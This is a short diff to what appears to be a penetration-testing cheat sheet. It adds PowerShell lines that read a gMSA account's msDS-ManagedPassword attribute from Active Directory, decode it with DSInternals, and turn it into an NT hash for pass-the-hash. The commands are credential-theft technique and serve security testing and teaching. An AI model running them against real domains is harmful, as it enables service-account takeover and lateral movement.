@@ -54,6 +54,8 @@ $gmsa = Get-ADServiceAccount -Identity 'Target_Account' -Properties 'msDS-Manage
 $mp = $gmsa.'msDS-ManagedPassword'
 
 # Decode the data structure using the DSInternals module
+ConvertFrom-ADManagedPasswordBlob $mp
+# Build a NT-Hash for PTH
 (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash
 ```
 
